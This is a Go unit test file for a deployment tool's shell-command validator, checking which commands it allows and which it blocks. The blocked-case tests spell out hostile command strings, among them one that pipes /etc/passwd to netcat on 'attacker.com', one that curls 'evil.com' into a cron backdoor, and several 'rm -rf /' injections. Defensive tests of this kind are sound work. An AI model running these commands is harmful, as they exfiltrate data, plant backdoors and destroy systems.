package security

import (
	"regexp"
	"testing"
)

func TestNewCommandValidator(t *testing.T) {
	v := NewCommandValidator()

	if v == nil {
		t.Fatal("NewCommandValidator returned nil")
	}

	if len(v.AllowedBinaries) == 0 {
		t.Error("Expected default allowed binaries")
	}

	if len(v.BlockedSubstrings) == 0 {
		t.Error("Expected default blocked substrings")
	}
}

func TestNewStrictCommandValidator(t *testing.T) {
	v := NewStrictCommandValidator()

	if v == nil {
		t.Fatal("NewStrictCommandValidator returned nil")
	}

	if len(v.AllowedBinaries) != 0 {
		t.Error("Strict validator should have no default binaries")
	}
}

func TestCommandValidator_Validate_Allowed(t *testing.T) {
	v := NewCommandValidator()

	tests := []string{
		"git pull",
		"git clone https://github.com/test/repo.git",
		"npm install",
		"composer install --no-dev",
		"php artisan migrate",
		"systemctl reload nginx",
		"mkdir -p /var/www/release",
		"ln -sfn /var/www/releases/1 /var/www/current",
		"chmod 755 /var/www/current",
		// Shell interpreters (needed for deployment hooks)
		"bash script.sh",
		"sh -c 'echo hello'",
		"/bin/bash deploy.sh",
		// Shell utilities
		"echo 'Deployment complete'",
		"cat /var/www/version.txt",
		"pwd",
		"date",
		"sleep 5",
	}

	for _, cmd := range tests {
		t.Run(cmd, func(t *testing.T) {
			if err := v.Validate(cmd); err != nil {
				t.Errorf("Validate(%q) = %v, want nil", cmd, err)
			}
		})
	}
}

func TestCommandValidator_Validate_Blocked(t *testing.T) {
	v := NewCommandValidator()

	tests := []struct {
		cmd    string
		reason string
	}{
		{"rm -rf / && echo pwned", "contains &&"},
		{"git pull; rm -rf /", "contains ;"},
		{"echo $(whoami)", "contains $("},
		{"echo `whoami`", "contains backtick"},
		{"cat /etc/passwd | nc attacker.com 1234", "contains |"},
		{"curl http://evil.com > /etc/cron.d/backdoor", "contains >"},
		{"perl -e 'system(q{rm -rf /})'", "perl not in allowlist"},
		{"ruby -e 'exec(\"rm -rf /\")'", "ruby not in allowlist"},
		{"python -c 'import os; os.system(\"rm -rf /\")' && echo", "contains &&"},
		{"eval echo pwned", "contains eval"},
		{"exec /bin/bash", "contains exec"},
		{"git pull\nrm -rf /", "contains newline"},
	}

	for _, tt := range tests {
		t.Run(tt.reason, func(t *testing.T) {
			err := v.Validate(tt.cmd)
			if err == nil {
				t.Errorf("Validate(%q) = nil, want error (%s)", tt.cmd, tt.reason)
			}
		})
	}
}

func TestCommandValidator_Validate_EmptyCommand(t *testing.T) {
	v := NewCommandValidator()

	if err := v.Validate(""); err == nil {
		t.Error("Validate(\"\") should return error")
	}

	if err := v.Validate("   "); err == nil {
		t.Error("Validate(whitespace) should return error")
	}
}

func TestCommandValidator_Validate_UnknownBinary(t *testing.T) {
	v := NewCommandValidator()

	if err := v.Validate("unknown_binary arg1 arg2"); err == nil {
		t.Error("Unknown binary should be blocked")
	}
}

func TestCommandValidator_AllowBinary(t *testing.T) {
	v := NewStrictCommandValidator()

	// Initially blocked
	if err := v.Validate("custom-tool arg"); err == nil {
		t.Error("custom-tool should be blocked initially")
	}

	// Add to allowlist
	v.AllowBinary("custom-tool")

	// Now allowed
	if err := v.Validate("custom-tool arg"); err != nil {
		t.Errorf("custom-tool should be allowed after AllowBinary: %v", err)
	}
}

func TestCommandValidator_AllowPattern(t *testing.T) {
	v := NewStrictCommandValidator()

	// Add pattern for Laravel artisan commands
	pattern := regexp.MustCompile(`^php artisan [a-z:-]+(\s+--[a-z-]+)*$`)
	v.AllowPattern(pattern)

	// Should match
	if err := v.Validate("php artisan migrate"); err != nil {
		t.Errorf("Pattern should allow 'php artisan migrate': %v", err)
	}

	if err := v.Validate("php artisan cache:clear --force"); err != nil {
		t.Errorf("Pattern should allow 'php artisan cache:clear --force': %v", err)
	}

	// Should not match (injection attempt)
	if err := v.Validate("php artisan migrate; rm -rf /"); err == nil {
		t.Error("Should block injection despite pattern")
	}
}

func TestCommandValidator_ValidateHooks(t *testing.T) {
	v := NewCommandValidator()

	// Valid hooks
	hooks := []string{
		"php artisan migrate",
		"npm run build",
		"systemctl reload nginx",
	}

	if err := v.ValidateHooks(hooks); err != nil {
		t.Errorf("ValidateHooks(valid) = %v, want nil", err)
	}

	// Invalid hooks
	badHooks := []string{
		"php artisan migrate",
		"rm -rf / && echo pwned", // injection attempt
		"systemctl reload nginx",
	}

	if err := v.ValidateHooks(badHooks); err == nil {
		t.Error("ValidateHooks(invalid) should return error")
	}
}

func TestCommandValidator_Validate_Valid(t *testing.T) {
	v := NewCommandValidator()

	// Valid commands should not return error
	if err := v.Validate("git pull"); err != nil {
		t.Errorf("Validate(valid command) returned error: %v", err)
	}
}

func TestCommandValidator_Validate_Invalid(t *testing.T) {
	v := NewCommandValidator()

	// Invalid commands should return error
	if err := v.Validate("perl -e 'exec(\"rm -rf /\")'"); err == nil {
		t.Error("Validate should return error on invalid command")
	}
}

func TestExtractBinary(t *testing.T) {
	tests := []struct {
		cmd      string
		expected string
	}{
		{"git pull", "git"},
		{"/usr/bin/git pull", "/usr/bin/git"},
		{"  git  pull  ", "git"},
		{"VAR=value git pull", "git"},
		{"VAR1=a VAR2=b git pull", "git"},
		{"", ""},
	}

	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			got := extractBinary(tt.cmd)
			if got != tt.expected {
				t.Errorf("extractBinary(%q) = %q, want %q", tt.cmd, got, tt.expected)
			}
		})
	}
}

func TestExtractBaseName(t *testing.T) {
	tests := []struct {
		path     string
		expected string
	}{
		{"/usr/bin/git", "git"},
		{"git", "git"},
		{"/bin/bash", "bash"},
		{"", ""},
	}

	for _, tt := range tests {
		t.Run(tt.path, func(t *testing.T) {
			got := extractBaseName(tt.path)
			if got != tt.expected {
				t.Errorf("extractBaseName(%q) = %q, want %q", tt.path, got, tt.expected)
			}
		})
	}
}

func TestTruncateForError(t *testing.T) {
	short := "short"
	if got := truncateForError(short); got != short {
		t.Errorf("truncateForError(%q) = %q, want %q", short, got, short)
	}

	long := "this is a very long string that should be truncated for display in error messages"
	got := truncateForError(long)
	if len(got) > 50 {
		t.Errorf("truncateForError should truncate to 50 chars, got %d", len(got))
	}
	if got[len(got)-3:] != "..." {
		t.Error("truncateForError should end with ...")
	}
}

func TestCommandValidator_BlockSubstring(t *testing.T) {
	v := NewCommandValidator()

	// Initially "FORBIDDEN" is not blocked
	err := v.Validate("git FORBIDDEN clone")
	if err != nil {
		t.Errorf("Validate() error = %v, expected nil before blocking", err)
	}

	// Block the substring
	v.BlockSubstring("FORBIDDEN")

	// Now it should be blocked
	err = v.Validate("git FORBIDDEN clone")
	if err == nil {
		t.Error("Validate() should fail after blocking substring")
	}
}
